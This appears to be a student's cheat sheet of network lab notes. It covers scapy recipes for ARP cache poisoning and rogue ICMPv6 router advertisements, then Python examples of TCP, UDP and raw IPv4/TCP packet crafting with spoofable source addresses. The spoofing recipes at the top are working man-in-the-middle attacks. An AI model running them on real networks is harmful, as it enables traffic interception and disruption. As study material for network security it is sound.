<------------ARP Cache Poison----------->
su root > echo 1 > /proc/sys/net/ipv4/conf/all/arp_accept
su root > ip -s neigh flush all
#Find the different mac/IP addresses associated with target IP:
arp -a
Get MAC of target IP
Nmap -O <target_IP>
sudo scapy
#set up packet <-------IT IS CASE SENSITIVE-------->
a=Ether()
a.src= ""	#My MAC
a.dst= ""	#Victim's MAC
a.type=		#0x0806 (for ARP)

b=ARP()
b.op=		#number < 2 > for arp reply(is-at)
b.hwsrc= ""	#My MAC
b.psrc= ""	#IP I am pretending to be
b.pdst= ""	#IP of Victim
b.hwdst= ""	#MAC of Victim
sendp(a/b, iface="")	#iface= is my internet facing interface 

<-----Results in the Following-------->
>>> a.show()
###[ Ethernet ]### 
  dst= fa:16:3e:d7:41:26
  src= fa:16:3e:34:e8:9b
  type= 0x806
>>> b.show()
###[ ARP ]### 
  hwtype= 0x1
  ptype= 0x800
  hwlen= 6
  plen= 4
  op= is-at
  hwsrc= fa:16:3e:34:e8:9b
  psrc= 192.168.65.30
  hwdst= fa:16:3e:d7:41:26
  pdst= 192.168.65.10

===============================================================
<--------functional ICMPv6 Router Advertisement ------------>
#set up packet <-------IT IS CASE SENSITIVE-------->
#May need ether frame:
Src mac = your mac
Tgt mac
Type = dont mess with it

a = IPv6()
a.dst = ""			#Target IPv6 addr
b = ICMPv6ND_RA()
c = ICMPv6NDOptSrcLLAddr()
c.lladdr = ""			#Attacker MAC
d = ICMPv6NDOptMTU()
e = ICMPv6NDOptPrefixInfo()
e.prefixlen= 64
e.prefix= ""			#any hex you want
send(a/b/c/d/e, iface="")	#iface= is my internet facing interface

===============================================================
<----------------STREAM SOCKET------------------->
import socket

#Create Variable to open stream socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM,0)

#By default
# s = socket.socket()

#Create socket IP and Port
ipaddr = "172.16.1.15"
port = 5309 #or hex number

# Connection setup
s.connect((ipaddr, port)) #or address = ipaddr, port

#to send a messsage it must be bits like format. To do that add the prefix 'b' to a string.
message = b"Jenny"

#send my message
s.send(message)

#you can receive a response by splitting the response into data and address information
# it is recommended that the buffer size for recieving is a power of 2 and not too large. (in bytes)
response, conn = s.recvfrom(1024)

#In oder to actually see the response you must print and decode the data into UTF-8.
#It does decode(UTF-8) by default
print(response.decode())

#always close TCP connection
s.close()

===============================================================
<------------------DGRAM----------------->
import socket

#Create variable for socket function
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Connect to IP and port using data instead of variable
s.connect(("127.0.0.1", 10000))

#Send a message
s.send(b"Disturbed")

#split the recieved data into data and connection info
response, conn = s.recvfrom(1024)

#split connection info into ip and port
ipaddr, port = conn

#decode() is utf-8 by default
print(response.decode("utf-8"))

===============================================================
<-----------IPv4 RAW SOCKET--------------->
#import for socket creation
import socket

#import for structuring the packet
from struct import *

#import for system level commands
import sys

#import for encoding / decoding binascii
import binascii

### Create a raw socket with error handling ###
try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
except socket.error as msg:
        print(msg)
        sys.exit()

### Create the variable for the IPv4 header ###
saddr = ""
daddr = ""

ip_ver_ihl = 0x45       #standard versoin and IHL
ip_tos = 0x60           # DSCP 24 and no ECN (or 96 for decimal)
ip_lenght = 0           #kernel will fill this in
ip_id = 12345           #pick one
ip_frag = 0x2000        #combination of frag flags and offset (for more frag bit set)
ip_ttl = 128            #default ttl of a windows machine
ip_proto = 16           #IP protocols (no additional header) 16 is for chaos
ip_check = 0            #filled in by kernel
ip_saddr = socket.inet_aton("10.10.0.40")       #dotted decimal notation str converted to 32 bit data
ip_daddr = socket.inet_aton("172.16.1.15")      #dotted decimal notation str converted to 32 bit data

### Combine variables into network order to send ###
# format of '!' is determining if the variables are packed into Network Order.
# from characters after the '!', you can use 'B' (1 Byte as int), 'H' (2 Bytes as int), 'L' (4 Bytes as int), '4s' (4 Bytes as st$
ip_header = pack('!BBHHHBBH4s4s', ip_ver_ihl, ip_tos, ip_lenght, ip_id, ip_frag, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

### Create a data variable to send a message ###
data = b"Hello World"

### Encode message with binascii ###
#encoded = binascii.b2a_uu(data)

### Combine ip header with data ###
packet = ip_header + data
#packet - ip_header + encoded

### Uses sendto() function since we are not establishing connection ###
s.sendto(packet, ("172.16.1.15", 0))

==========================================================================
<---------------------IPv4 TCP RAW SOCKET------------------->
# Begin imports
import socket
from struct import *
import sys
import binascii
# Add array for TCP checksum
import array

# attempt tp create a raw socket with error handling
try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
except socket.error as msg:
        print(msg)
        sys.exit()

# IP variable setup
src_ip = "10.10.0.40"
dst_ip = "172.16.40.10"

# Construct the IPv4 header variables
ip_ver = 4              #set to 4 for normal traffic
ip_ihl = 5              #set to 5 for normal traffic
ip_dscp = 0             #set to the dscp value wanted
ip_ecn = 0              #set to the value needed if ECE is set
ip_len = 0              #kernel will fill this in
ip_id = 2020            #set to what you want
ip_frag_res = 0         #used for the reserve frag flag
ip_frag_df = 0          #used for the DF frag flag
ip_frag_mf = 0          #used for the MF frag flag
ip_frag_offset = 0      #used for frag offset values
ip_ttl = 77             #set to TTL you want
ip_proto = 6            #set to 6 or socket.IPPROTO_TCP
ip_check = 0            #kernel will fill this in
ip_saddr = socket.inet_aton(src_ip)
ip_daddr = socket.inet_aton(dst_ip)

# Combined variables as needed
ip_ver_ihl = (ip_ver<<4) + ip_ihl       #left shift version by 4
ip_tos =  (ip_dscp<<2) + ip_ecn         #left shift dscp by 2

# Fragmentation field - combine frag flags then add to frag offset
ip_frag_flags = (ip_frag_res<<15) + (ip_frag_df<<14) + (ip_frag_mf<<13)
ip_frag = ip_frag_flags + ip_frag_offset

# Pack the header use the '!' for network order and using only complete variable
# After ! the values are 'B' (1 byte int), 'H' (2 Bytes int), 'L' (4 Bytes int), '4s' (4 Bytes strings)

ip_header = pack('!BBHHHBBH4s4s', ip_ver_ihl, ip_tos, ip_len, ip_id, ip_frag, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

# Create TCP header variables
tcp_src_port = 54321            #set tcp source port - use RHP
tcp_dst_port = 1234             #set tcp dest port
tcp_seq_num = 90210             #set sequence number
tcp_ack_num = 30905             #set to 0 unless used with ACK flag
tcp_offset = 5                  #set to 5 for tcp with no options (offset * 4 for the tcp header size)
tcp_res = 0                     #set to 0 as reserved

# Create tcp flag variables per bit location
tcp_cwr = 0             #TCP CWR Flag
tcp_ece = 0             #TCP ECE Flag
tcp_urg = 0             #TCP URG Flag
tcp_ack = 0             #TCP ACK Flag
tcp_psh = 0             #TCP PSH Flag
tcp_rst = 0             #TCP RST Flag
tcp_syn = 1             #TCP SYN Flag
tcp_fin = 0             #TCP FIN Flag

# Continue creating tcp header variables
#tcp_window = 5840
tcp_window = socket.htons(5840)
tcp_check = 0           #will be set below
tcp_urg_pointer = 0     #this will be set when URG flag is set

# Combine TCP fields into complete bytes as needed
tcp_off_res = (tcp_offset<<4) + tcp_res

tcp_flags = (tcp_cwr<<7) + (tcp_ece<<6) + (tcp_urg<<5) + (tcp_ack<<4) + (tcp_psh<<3) + (tcp_rst<<2) + (tcp_syn<<1) + tcp_fin

# Pack the TCP header IOT fill in the tcp checksum - tcp checksum is not in network order
# After ! the values are 'B' (1 byte int), 'H' (2 Bytes int), 'L' (4 Bytes int), '4s' (4 Bytes strings)
tcp_header = pack('!HHLLBBH', tcp_src_port, tcp_dst_port, tcp_seq_num, tcp_ack_num, tcp_off_res, tcp_flags, tcp_window) + pack('H', tcp_check) + pack('!H', tcp_urg_pointer)

# Create a varible for user data
user_data = b"Hello"

# Encode data
hidden_msg = binascii.b2a_hex(user_data)

# Create Pseudo header for checksum calculation
src_address = socket.inet_aton(src_ip)          #from IP header
dst_address = socket.inet_aton(dst_ip)          #from IP header
reserved = 0                                    #8 bits reserved for padding
protocol = socket.IPPROTO_TCP                   #from ip header = 6
tcp_lenght = len(tcp_header) + len(hidden_msg)  #combined length of tcp header and tcp data (user data)

# Pack the pseudo header to combine with user data
# After ! the values are 'B' (1 byte int), 'H' (2 Bytes int), 'L' (4 Bytes int), '4s' (4 Bytes strings)
ps_header = pack('!4s4sBBH', src_address, dst_address, reserved, protocol, tcp_lenght)

# Combine Pseudo header with TCP header and hidden_msg
ps_header = ps_header + tcp_header + hidden_msg

# Build def for TCP checksum calculation
def checksum(data):
        if len(data) % 2 !=0:
                data += b'\0'
        res = sum(array.array("H", data))
        res = (res >> 16) + (res & 0xffff)
        res += res >> 16
        return (~res) & 0xffff

# Recreate TCP checksum variable && repack tcp header including new checksum value (resue previous tcp header pack from above) 
tcp_check = checksum(ps_header)
tcp_header = pack('!HHLLBBH', tcp_src_port, tcp_dst_port, tcp_seq_num, tcp_ack_num, tcp_off_res, tcp_flags, tcp_window) + pack('H', tcp_check) + pack('!H', tcp_urg_pointer)

# Combine IP header with new TCP header and user data
packet = ip_header + tcp_header + hidden_msg

# Send the packet to the destination
s.sendto(packet, (dst_ip, 0))


